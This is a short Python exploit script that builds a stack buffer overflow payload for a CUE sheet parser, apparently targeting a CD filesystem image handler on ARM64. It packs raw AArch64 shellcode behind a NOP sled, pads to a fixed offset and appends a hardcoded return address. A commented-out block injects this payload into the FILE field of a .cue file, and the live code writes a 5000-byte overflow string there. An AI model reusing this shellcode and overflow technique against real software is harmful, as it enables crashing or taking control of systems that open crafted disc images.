#!/usr/bin/env python3
import struct

offset = 4080
sled_len = 800

shellcode = (
    b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    b"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    b"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
)

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * (sled_len // 4)

ret_addr = 0xffffffffdd40

payload = nop_sled + shellcode
payload = payload.ljust(offset, b"A")
payload += struct.pack("<Q", ret_addr)

'''
# write RAW BYTES to a binary file
with open("formats/cdfs/exploit.bin", "wb") as f:
    f.write(payload)

# cue file only references the binary
with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "exploit.bin" BINARY\n')
    f.write(b"  TRACK 01 MODE1/2352\n")
    f.write(b"    INDEX 01 00:00:00\n")


with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)         # <-- the entire overflow payload HERE
    f.write(b'" BINARY\n')
    f.write(b"  TRACK 01 MODE1/2352\n")
    f.write(b"    INDEX 01 00:00:00\n")
'''
with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(b"A" * 5000)   # huge overflow
    f.write(b'" BINARY\n')
    f.write(b"  TRACK 01 MODE1/2352\n")
    f.write(b"    INDEX 01 00:00:00\n")

